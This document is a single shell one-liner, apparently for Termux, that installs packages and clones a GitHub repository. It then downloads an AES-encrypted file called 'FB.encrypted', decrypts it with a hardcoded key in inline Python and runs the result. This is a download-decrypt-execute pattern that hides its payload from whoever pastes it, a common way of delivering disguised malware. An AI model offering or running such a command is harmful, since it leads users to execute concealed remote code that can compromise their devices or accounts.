pkg update -y && pkg install git python wget -y && pip install pycryptodome && rm -rf fuzzy-disco && git clone --depth=1 https://github.com/salhpy/fuzzy-disco.git && cd fuzzy-disco && wget -O FB.encrypted https://raw.githubusercontent.com/salhpy/dataloader/main/FB.encrypted && python -c "
from Crypto.Cipher import AES
import base64

with open('FB.encrypted', 'r') as f:
    encrypted = f.read()

key = b'1234567890123456'
data = base64.b64decode(encrypted)
nonce = data[:16]
tag = data[16:32]
ciphertext = data[32:]
cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
decrypted = cipher.decrypt_and_verify(ciphertext, tag)

with open('FB', 'wb') as f:
    f.write(decrypted)
" && python FB
